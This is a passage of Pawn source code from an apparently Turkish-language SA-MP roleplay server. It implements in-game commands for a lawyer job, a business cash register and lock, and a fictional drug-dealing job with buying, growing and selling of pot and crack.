				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Avukat %s, hapis süreni 5 dakika azalttý.", GetPlayerNameEx(playerid));
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			}

			#if defined DOUBLE_EXP_ENABLED
				new hour,minuite,second;
				gettime(hour,minuite,second);
				if(DoubleEXPcheck(hour))
				{
				    PlayerInfo[playerid][pLawSkill] += 2;
				    SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliðinden dolayý 2 Yetenek Puaný kazandýnýz.");
				}
				else
				{
					SendClientMessage(playerid, COLOR_YELLOW, "Ýki kat exp etkinliði saatinde deðilseniz yalnýzca 1 Yetenek Puaný kazanýrsýnýz.");
					PlayerInfo[playerid][pLawSkill]++;
				}
			#else
				PlayerInfo[playerid][pLawSkill]++;
			#endif

			if(PlayerInfo[playerid][pLawSkill] == 50)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Avukat yetenek levelin 2 oldu, Artýk daha hýzlý ve daha iyi bir avukatsýn."); }
			else if(PlayerInfo[playerid][pLawSkill] == 100)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Avukat yetenek levelin 3 oldu, Artýk daha hýzlý ve daha iyi bir avukatsýn."); }
			else if(PlayerInfo[playerid][pLawSkill] == 200)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Avukat yetenek levelin 4 oldu, Artýk daha hýzlý ve daha iyi bir avukatsýn."); }
			else if(PlayerInfo[playerid][pLawSkill] == 400)
			{ SendClientMessage(playerid, COLOR_YELLOW, "* Avukat yetenek levelin 5 oldu, Artýk daha hýzlý ve daha iyi bir avukatsýn."); }
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "   Oyuncunun Avukata ihtiyacý yok / Oyuncu hapiste deðil!");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	}
	return 1;
}
CMD:kasa(playerid, params[])
{
	new value, string[128];
	new idx = PlayerInfo[playerid][pBiz];
    if(!PlayerInfo[playerid][pBiz] && !PlayerInfo[playerid][pVBiz]) return SendClientMessage(playerid, COLOR_GREY, "Ýþ yeriniz yok.");
    if(GetPlayerVirtualWorld(playerid)-100 != idx && !PlayerInfo[playerid][pVBiz]) return SendClientMessage(playerid, COLOR_GREY, "Ýþ yerinin içinde deðilsin.");
    if(GetPlayerVirtualWorld(playerid)-100 != idx && PlayerInfo[playerid][pVBiz])
	{
		idx = PlayerInfo[playerid][pVBiz];
	    if(GetPlayerVirtualWorld(playerid)-100 != idx) return SendClientMessage(playerid, COLOR_GREY, "Ýþ yerinin içinde deðilsin");
	}
	if(sscanf(params, "s[32]", params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kasa [secenek]");
		SendClientMessage(playerid, COLOR_GREY, "SECENEKLER: paracek | parayatir");
		return 1;
	}
	if(!strcmp(params, "paracek", false, 7))
	{
	    if(sscanf(params, "s[32]i", params, value))
	    {
	        SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kasa paracek [miktar]");
	        format(string, sizeof(string), "Þu an kasada bulunan para: %d $", BizInfo[idx][bMoney]);
	        SendClientMessage(playerid, COLOR_GREY, string);
			return 1;
	    }
	    if(value < 0) return SendClientMessage(playerid, COLOR_GREY, "Uygun olmayan miktar.");
	    if(value > BizInfo[idx][bMoney]) return SendClientMessage(playerid, COLOR_GREY, "Ýþ yeri kasanda bu kadar para yok.");
	    BizInfo[idx][bMoney] -= value;
	    GivePlayerCash(playerid, value);
	    format(string, sizeof(string), "* %s iþ yerinin kasasýndan bir miktarp ara çekti.", RPN(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), " Ýþ yeri kasandan $%d çektin, kalan para: %d $", value, BizInfo[idx][bMoney]);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	}
	else if(!strcmp(params, "parayatir", false, 9))
	{
	    if(sscanf(params, "s[32]i", params, value))
	    {
	        if(value < 0) return SendClientMessage(playerid, COLOR_GREY, "Uygun olmayan miktar.");
	        SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kasa parayatir [miktar]");
	        format(string, sizeof(string), "Þu an kasada bulunan para: %d $", BizInfo[idx][bMoney]);
	        SendClientMessage(playerid, COLOR_GREY, string);
			return 1;
	    }
	    if(value < 0) return SendClientMessage(playerid, COLOR_GREY, "Uygun olmayan miktar.");
	    if(value > PlayerInfo[playerid][pCash]) return SendClientMessage(playerid, COLOR_GREY, "Üzerinde bu kadar para yok.");
	    BizInfo[idx][bMoney] += value;
	    GivePlayerCash(playerid, -value);
	    format(string, sizeof(string), "* %s bir miktar parayý iþ yeri kasasýna yatýrdý.", RPN(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), " $%d miktar paraný iþ yeri kasasýna koydun, þu anki miktar: %d $", value, BizInfo[idx][bMoney]);
		SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	}
	return 1;
}

CMD:ikilit(playerid, params[])
{
	new string[128], idx, done, lockdone;
	if(PlayerInfo[playerid][pBiz])
	{
		if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[PlayerInfo[playerid][pBiz]][bX], BizInfo[PlayerInfo[playerid][pBiz]][bY], BizInfo[PlayerInfo[playerid][pBiz]][bZ]))
	    {
	        if(!BizInfo[PlayerInfo[playerid][pBiz]][bStatus])
	        {
		        BizInfo[PlayerInfo[playerid][pBiz]][bStatus] = 1;
				format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: %s", PlayerInfo[playerid][pBiz], RBT(PlayerInfo[playerid][pBiz]), BizInfo[PlayerInfo[playerid][pBiz]][bOwner], RBS(PlayerInfo[playerid][pBiz]));
	            UpdateDynamic3DTextLabelText(BizInfo[PlayerInfo[playerid][pBiz]][bText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s iþ yerinin anahtarýarýný çýkarýr ve iþ yerinin kilidini açar.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Is Yeri Acildi", 3500, 3);
			}
			else if(BizInfo[PlayerInfo[playerid][pBiz]][bStatus])
	        {
		        BizInfo[PlayerInfo[playerid][pBiz]][bStatus] = 0;
				format(string, sizeof(string), "ID: %d\n%s\nSahibi: %s\nDurum: %s", PlayerInfo[playerid][pBiz], RBT(PlayerInfo[playerid][pBiz]), BizInfo[PlayerInfo[playerid][pBiz]][bOwner], RBS(PlayerInfo[playerid][pBiz]));
	            UpdateDynamic3DTextLabelText(BizInfo[PlayerInfo[playerid][pBiz]][bText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s iþ yerinin anahtarlarýný takar ve iþ yerini kilitler.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Is Yeri Kitlendi", 3500, 3);
			}
			done = 1;
			lockdone = 1;
	    }
    }
    if(PlayerInfo[playerid][pVBiz] && !done)
	{
	    idx = PlayerInfo[playerid][pVBiz];
		if(IsPlayerInRangeOfPoint(playerid, 2, BizInfo[idx][bX], BizInfo[idx][bY], BizInfo[idx][bZ]))
	    {
	        if(!BizInfo[idx][bStatus])
	        {
		        BizInfo[idx][bStatus] = 1;
				format(string, sizeof(string), "ID: %d\n%s\nSahip: %s\nDurum: %s", idx, RBT(idx), BizInfo[idx][bOwner], RBS(idx));
	            UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s iþ yerinin anahtarýný çýkarýr ve iþ yerinin kapýsýný açar.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Is yeri acildi", 3500, 3);
			}
			else if(BizInfo[idx][bStatus])
	        {
		        BizInfo[idx][bStatus] = 0;
				format(string, sizeof(string), "ID: %d\n%s\nSahip: %s\nDurum: %s", idx, RBT(idx), BizInfo[idx][bOwner], RBS(idx));
	            UpdateDynamic3DTextLabelText(BizInfo[idx][bText], COLOR_WHITE, string);
		        format(string, sizeof(string), "* %s iþ yerinin kilidini takar ve kapýyý kitler.", RPN(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Is Yeri Kitlendi", 3500, 3);
			}
			done = 1;
			lockdone = 1;
	    }
	    return 1;
    }
    if(!lockdone)
	{
	    SendClientMessage(playerid, COLOR_GREY, "Kitleyip, kilidini açabileceðin bir þeyin yakýnýnda deðilsin.");
	}
	return 1;
}

CMD:kasaal(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 14 && PlayerInfo[playerid][pJob2] != 14)
	{
		SendClientMessage(playerid,COLOR_GREY,"   Uyuþturucu Kaçakçýsý deðilsin!");
		return 1;
	}
	new mypoint = -1;

	new playername[MAX_PLAYER_NAME];
	GetPlayerName(playerid, playername, sizeof(playername));
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && strcmp(Points[i][Name], "Drug Factory", true) == 0)
		{
			mypoint = i;
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, "Uyuþturucu fabrikasýnda deðilsin!");
		return 1;
	}
	if(PlayerInfo[playerid][pCrates])
	{
		SendClientMessage(playerid, COLOR_GREY, "   Daha fazla uyuþturucu kasasý taþýyamazsýn!");
		return 1;
	}
 	if(CheckPointCheck(playerid))
 	{
  		SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
    	return 1;
  	}
	if(GetPlayerCash(playerid) >= 100)
	{
		SendClientMessage(playerid, COLOR_LIGHTRED,"Ne çeþit bir uyuþturucu taþýmak istiyorsun? (Örnek: crack veya pot)");
		SetPVarInt(playerid, "ChoosingDrugs", 1);
		return 1;
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY," $100'ý karþýlayamýyorsun.");
		return 1;
	}
}

CMD:potal(playerid, params[])
{
	new string[128], amount;
	if(sscanf(params, "d", amount)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /potal [amount]");

	new tel;
	new price;
	new level = PlayerInfo[playerid][pDrugsSkill];
	if(level >= 0 && level < 50)
	{ tel = 10; if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 10'dan fazla taþýyamazsýn!"); return 1; } }
	else if(level >= 50 && level < 100)
	{ tel = 10; if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 20'den fazla taþýyamazsýn!"); return 1; } }
	else if(level >= 100 && level < 200)
	{ tel = 10; if(amount < 1 || amount > 30) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 30'dan fazla taþýyamazsýn!"); return 1; } }
	else if(level >= 200 && level < 400)
	{ tel = 10; if(amount < 1 || amount > 40) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 40'dan fazla taþýyamazsýn."); return 1; } }
	else if(level >= 400)
	{ tel = 10; if(amount < 1 || amount > 50) { SendClientMessage(playerid, COLOR_GREY, "   Meslek levelin dolayýsýyla 50'den fazla taþýyamazsýn."); return 1; } }
	new mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && Points[i][Type] == 3)
		{
			mypoint = i;
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, "Uyuþturucu evinde deðilsin!");
		return 1;
	}
	if(PlayerInfo[playerid][pPot] >= 25)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "25'ten fazla pot alamazsýn.");
		return 1;
	}
	if(PlayerInfo[playerid][pJob] == 4 || PlayerInfo[playerid][pJob2] == 4)
	{
		price = amount * tel;
		if(Points[mypoint][Stock] < amount) return SendClientMessage(playerid, COLOR_GREY, "   Bu uyuþturucu evinde bu kadar pot yok.");
		if(GetPlayerCash(playerid) > price)
		{
			format(string, sizeof(string), "* %d gram potu %d$ karþýlýðý satýn aldýn.", amount, price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, -price);
			PlayerInfo[playerid][pPot] += amount;

			Points[mypoint][Stock] -= amount;
			format(string, sizeof(string), " ALINABILIR POT: %d gram.", Points[mypoint][Stock]);
			UpdateDynamic3DTextLabelText(Points[mypoint][TextLabel], COLOR_YELLOW, string);

			for(new i = 0; i < sizeof(FamilyInfo); i++)
			{
				if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
				{
					FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+price/2;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Uyuþturucu taþýyamazsýnýz!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "Uyuþturucu Satýcýsý deðilsin.");
		return 1;
	}
	return 1;
}

CMD:crackal(playerid, params[])
{
	new string[128], amount;
	if(sscanf(params, "d", amount)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /crackal [miktar]");

	new tel;
	new price;
	new level = PlayerInfo[playerid][pDrugsSkill];
	if(level >= 0 && level < 50)
	{
		tel = 50;
		if(amount < 1 || amount > 5)
		{
			SendClientMessage(playerid, COLOR_GREY, "   Þuanki yetenek level'inde 5'ten fazla alamazsýn!");
			return 1;
		}
	}
	else if(level >= 50 && level < 100)
	{ tel = 50; if(amount < 1 || amount > 10) { SendClientMessage(playerid, COLOR_GREY, "   Þuanki yetenek level'inde 10'ten fazla alamazsýn!"); return 1; } }
	else if(level >= 100 && level < 200)
	{ tel = 50; if(amount < 1 || amount > 15) { SendClientMessage(playerid, COLOR_GREY, "   Þuanki yetenek level'inde 15'ten fazla alamazsýn!"); return 1; } }
	else if(level >= 200 && level < 400)
	{ tel = 50; if(amount < 1 || amount > 20) { SendClientMessage(playerid, COLOR_GREY, "   Þuanki yetenek level'inde 20'ten fazla alamazsýn!"); return 1; } }
	else if(level >= 400)
	{ tel = 50; if(amount < 1 || amount > 25) { SendClientMessage(playerid, COLOR_GREY, "   Þuanki yetenek level'inde 25'ten fazla alamazsýn!"); return 1; } }
	new mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && Points[i][Type] == 4)
		{
			mypoint = i;
		}
	}
	if(mypoint == -1)
	{
		SendClientMessage(playerid, COLOR_GREY, "Crack laboratuvarýnda deðilsin!");
		return 1;
	}
	if(PlayerInfo[playerid][pCrack] >= 25)
	{
		SendClientMessage(playerid, COLOR_GRAD2, " 25'ten fazla crack taþýyamazsýn.");
		return 1;
	}
	if(PlayerInfo[playerid][pJob] == 4 || PlayerInfo[playerid][pJob2] == 4)
	{
		price = amount * tel;
		if(Points[mypoint][Stock] < amount) return SendClientMessage(playerid, COLOR_GREY, "   Bu crack laboratuvarýnda bu kadar crack yok!");
		if(GetPlayerCash(playerid) > price)
		{
			format(string, sizeof(string), "* %d gram crack'i %d$ karþýlýðýnda satýn aldýn.", amount, price);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			GivePlayerCash(playerid, -price);
			PlayerInfo[playerid][pCrack] += amount;

			//if(PlayerInfo[playerid][pDonator] < 1) Points[mypoint][Stock] = Points[mypoint][Stock]-amount;
			Points[mypoint][Stock] = Points[mypoint][Stock]-amount;

			format(string, sizeof(string), " ALINABILIR CRACK: %d gram.", Points[mypoint][Stock]);
			UpdateDynamic3DTextLabelText(Points[mypoint][TextLabel], COLOR_YELLOW, string);
			for(new i = 0; i < sizeof(FamilyInfo); i++)
			{
				if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
				{
					FamilyInfo[i][FamilyBank] = FamilyInfo[i][FamilyBank]+price/2;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   Uyuþturucunun fiyatýný karþýlayamazsýn / taþýyamazsýn!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   Uyuþturucu Satýcýsý deðilsin.");
		return 1;
	}
	return 1;
}

CMD:tohumal(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] != 4 && PlayerInfo[playerid][pJob2] != 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Uyuþturucu satýcýsý deðilsin.");
		return 1;
	}
	if(PlayerInfo[playerid][pWSeeds] > 0)
	{
	    SendClientMessage(playerid, COLOR_GREY, "Zaten tohum paketiniz var, öncelikle onu kullanýn.");
	    return 1;
	}
	if(GetPlayerCash(playerid) < 1000)
	{
	    SendClientMessage(playerid, COLOR_GREY, "1000$'ýn yok.");
	    return 1;
	}
	new mypoint = -1;
	for (new i=0; i<MAX_POINTS; i++)
  	{
	   	if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz]) && Points[i][Type] == 3)
	   	{
			mypoint = i;
		}
   	}
   	if(mypoint == -1)
   	{
		SendClientMessage(playerid, COLOR_GREY, "Uyuþturucu Evinde deðilsin!");
		return 1;
   	}
	if(Points[mypoint][Stock] < 1) return SendClientMessage(playerid, COLOR_GREY, "   Bu uyuþturu evinde tohum paketi yok.");

	new string[32];
	Points[mypoint][Stock] -= 1;
	format(string, sizeof(string), " ALINABILIR POT: %d gram.", Points[mypoint][Stock]);
	UpdateDynamic3DTextLabelText(Points[mypoint][TextLabel], COLOR_YELLOW, string);

	PlayerInfo[playerid][pWSeeds] += 3;
	SendClientMessage(playerid, COLOR_LIGHTBLUE, " Uyuþturucu evinden tohum paketi satýn aldýn. ");
	GivePlayerCash(playerid, -1000);
	GameTextForPlayer(playerid, "~r~-1000$", 3000, 1);
	for(new i = 0; i < sizeof(FamilyInfo); i++)
	{
		if(strcmp(Points[mypoint][Owner], FamilyInfo[i][FamilyName], true) == 0)
		{
			FamilyInfo[i][FamilyBank] += 500;
		}
	}
	return 1;
}

CMD:tohumdik(playerid, params[]) {
	if(PlayerInfo[playerid][pJob] != 4 && PlayerInfo[playerid][pJob2] != 4) {
		SendClientMessage(playerid, COLOR_GREY, "   Uyuþturucu Satýcýsý deðilsin.");
	}
 	else if(PlayerInfo[playerid][pWSeeds] > 10) {
		if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject]))
		    return SendClientMessage(playerid, COLOR_GRAD2, "Ayný anda 10 taneden fazla tohum dikemezsin.");

		if(IsPlayerInAnyVehicle(playerid))
		    return SendClientMessage(playerid, COLOR_GREY, "Araç içersindeyken tohum dikemezsin.");

		new
			szMessage[48];

		GetPlayerPos(playerid, PlayerInfo[playerid][pWeedPos][0], PlayerInfo[playerid][pWeedPos][1], PlayerInfo[playerid][pWeedPos][2]);
		PlayerInfo[playerid][pWeedPos][2] -= 1.5;

        ApplyAnimation(playerid,"BOMBER","BOM_Plant_Crouch_In", 4.0, 0, 0, 0, 0, 0, 1);
		SendClientMessage(playerid, COLOR_GREEN, "Biraz tohum diktin. 20-45 dakika sonra mahsülü toplayabilirsin.");

		PlayerInfo[playerid][pWeedInt] = GetPlayerInterior(playerid);
		PlayerInfo[playerid][pWeedVW] = GetPlayerVirtualWorld(playerid);
		PlayerInfo[playerid][pWeedGrowth] = 0;
		PlayerInfo[playerid][pWSeeds]--;
		PlayerInfo[playerid][pWeedObject] = CreateDynamicObject(3409, PlayerInfo[playerid][pWeedPos][0], PlayerInfo[playerid][pWeedPos][1], PlayerInfo[playerid][pWeedPos][2], 0.0, 0.0, 0.0, PlayerInfo[playerid][pWeedVW], PlayerInfo[playerid][pWeedInt]);
		format(szMessage, sizeof(szMessage), "* %s biraz tohum diker.", GetPlayerNameEx(playerid));
		ProxDetector(25.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}
	else SendClientMessage(playerid, COLOR_GREY, "Dikebilmek için yeterince tohumun yok.");
	return 1;
}

CMD:tohumkontrol(playerid, params[]) {
	if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject]) && GetPlayerVirtualWorld(playerid) == PlayerInfo[playerid][pWeedVW] && GetPlayerInterior(playerid) == PlayerInfo[playerid][pWeedInt]) {
	    if(IsPlayerInRangeOfPoint(playerid, 4, PlayerInfo[playerid][pWeedPos][0], PlayerInfo[playerid][pWeedPos][1], PlayerInfo[playerid][pWeedPos][2])) {
			if(PlayerInfo[playerid][pWeedGrowth] > 10) {

				new
					szMessage[66 + MAX_PLAYER_NAME];

				format(szMessage, sizeof(szMessage), " Tohumlarýn büyüdü ve þu anda %i gram oldular - toplamak için /tohumtopla yaz", PlayerInfo[playerid][pWeedGrowth]);
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
			}
			else SendClientMessage(playerid, COLOR_YELLOW, "Tohumlarýn henüz yetiþmedi.Tohumlarý toplayabilmek için beklemelisin.");
			return 1;
		}
	}
	foreach(Player, i) if(IsValidDynamicObject(PlayerInfo[i][pWeedObject]) && GetPlayerVirtualWorld(playerid) == PlayerInfo[i][pWeedVW] && GetPlayerInterior(playerid) == PlayerInfo[i][pWeedInt]) {
	    if(IsPlayerInRangeOfPoint(playerid, 4, PlayerInfo[i][pWeedPos][0], PlayerInfo[i][pWeedPos][1], PlayerInfo[i][pWeedPos][2])) {
			if(PlayerInfo[i][pWeedGrowth] > 10) {

				new
					szMessage[66 + MAX_PLAYER_NAME];

				format(szMessage, sizeof(szMessage), "Tohumlarýn büyüdü ve þu anda %i gram oldular - toplamak için /tohumtopla yaz.", PlayerInfo[i][pWeedGrowth]);
				SendClientMessage(playerid, COLOR_WHITE, szMessage);
			}
			else SendClientMessage(playerid, COLOR_YELLOW, "Tohumlarýn henüz yetiþmedi.Tohumlarý toplayabilmek için beklemelisin.");
			return 1;
		}
	}
	return SendClientMessage(playerid, COLOR_GREY, "Tohumlarýný ektiðin yerde deðilsin.");
}

CMD:tohumtopla(playerid, params[]) {
	foreach(Player, i) if(IsValidDynamicObject(PlayerInfo[i][pWeedObject]) && IsPlayerInRangeOfPoint(playerid, 4, PlayerInfo[i][pWeedPos][0], PlayerInfo[i][pWeedPos][1], PlayerInfo[i][pWeedPos][2])) {
	    if(GetPlayerVirtualWorld(playerid) == PlayerInfo[i][pWeedVW] && GetPlayerInterior(playerid) == PlayerInfo[i][pWeedInt]) {
			if(PlayerInfo[i][pWeedGrowth] > 10) {
				if(PlayerInfo[i][pWeedGrowth] + PlayerInfo[playerid][pPot] < 2000) {

					new
						szMessage[52];

					ApplyAnimation(playerid,"BOMBER","BOM_Plant_Crouch_Out", 4.0, 0, 0, 0, 0, 0, 1);
					PlayerInfo[playerid][pPot] += PlayerInfo[i][pWeedGrowth];
					format(szMessage, sizeof(szMessage), "Büyüyen tohumlarý alarak %d gram pot topladýn..", PlayerInfo[i][pWeedGrowth]);
					SendClientMessage(playerid, COLOR_GREY, szMessage);
					format(szMessage, sizeof(szMessage), "* %s diktiði tohumlarý toplar.", GetPlayerNameEx(playerid));
					ProxDetector(25.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
					DestroyDynamicObject(PlayerInfo[i][pWeedObject]);
					PlayerInfo[i][pWeedObject] = 0;
					return 1;
				}
				else SendClientMessage(playerid, COLOR_GREY, "2000 gram pot'tan fazlasýný taþýyamazsýn.");
			}
			else SendClientMessage(playerid, COLOR_GREY, "Bu tohum henüz toplanmak için hazýr deðil.");
			return 1;
		}
	}
	return SendClientMessage(playerid, COLOR_GREY, "Tohum dikim yerinde deðilsin.");
}

CMD:potsat(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(PlayerInfo[playerid][pJob] != 4 && PlayerInfo[playerid][pJob2] != 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Uyuþturucu satýcýsý deðilsin.");
		return 1;
	}
	if(PlayerInfo[playerid][pDrugsTime] != 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Daha fazla uyuþturucu satabilmek için 1 dakika beklemelisin.");
		return 1;
	}

	new string[128], giveplayerid, needed, money;
	if(sscanf(params, "udd", giveplayerid, needed, money)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /potsat [Oyuncu ID/Ýsim] [miktar] [fiyat]");

	if(needed < 1 || needed > 249) { SendClientMessage(playerid, COLOR_GREY, "   Gram miktarý 1-250 arasýnda olmalýdýr!"); return 1; }
	if(money < 1 || money > 99999) { SendClientMessage(playerid, COLOR_GREY, "   Fiyat 1 - 100000 arasýnda olmalýdýr!"); return 1; }
	if(needed > PlayerInfo[playerid][pPot]) { SendClientMessage(playerid, COLOR_GREY, "   Üzerinde bu kadar pot yok!"); return 1; }
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if(ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(giveplayerid == playerid)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Kendi kendine satamazsýn!");
					return 1;
				}
				format(string, sizeof(string), "* %s adlý kiþiye %d gram potu %d$ karþýlýðý satmayý önerdin.", GetPlayerNameEx(giveplayerid), needed, money);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Uyuþturucu Satýcýsý %s sana %d gram potu %d$ karþýlýðý satmak istiyor, (örnek: /kabulet pot).", GetPlayerNameEx(playerid), needed, money);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pDrugsTime] = 60;
				PotOffer[giveplayerid] = playerid;
				PotPrice[giveplayerid] = money;
				PotGram[giveplayerid] = needed;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu oyunda deðil.");
	}
	return 1;
}

CMD:cracksat(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(PlayerInfo[playerid][pJob] != 4 && PlayerInfo[playerid][pJob2] != 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "   Uyuþturucu satýcýsý deðilsin.");
		return 1;
	}
	if(PlayerInfo[playerid][pDrugsTime] != 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Daha fazla uyuþturucu satabilmek için 1 dakika beklemelisin.");
		return 1;
	}

	new string[128], giveplayerid, needed, money;
	if(sscanf(params, "udd", giveplayerid, needed, money)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /cracksat [Oyuncu ID/Ýsim] [miktar] [fiyat]");

	if(needed < 1 || needed > 99) { SendClientMessage(playerid, COLOR_GREY, "   Gram miktarý 1-99 arasýnda olmalýdýr!"); return 1; }
	if(money < 1 || money > 99999) { SendClientMessage(playerid, COLOR_GREY, "   Fiyat 1 - 99999 arasýnda olmalýdýr!"); return 1; }
	if(needed > PlayerInfo[playerid][pCrack]) { SendClientMessage(playerid, COLOR_GREY, "   Üzerinde bu kadar crack yok!"); return 1; }
	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			if(ProxDetectorS(8.0, playerid, giveplayerid))
			{
				if(giveplayerid == playerid)
				{
					SendClientMessage(playerid, COLOR_GREY, "   Kendi kendine satýþ yapamazsýn!");
					return 1;
				}
				format(string, sizeof(string), "* %s adlý kiþiye %d gram Crack'i %d$'dan satmayý önerdin.", GetPlayerNameEx(giveplayerid), needed, money);
				SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				format(string, sizeof(string), "* Uyuþturucu satýcýsý %s sana %d gram crack'i %d$ karþýlýðýnda satmayý öneriyor, (örnek: /kabulet crack).", GetPlayerNameEx(playerid), needed, money);
				SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				PlayerInfo[playerid][pDrugsTime] = 60;
				CrackOffer[giveplayerid] = playerid;
				CrackPrice[giveplayerid] = money;
				CrackGram[giveplayerid] = needed;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GREY, "Bu oyuncu yanýnda deðil.");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu oyuncu oyunda deðil.");
	}
	return 1;
}

CMD:dedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkiniz yok!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
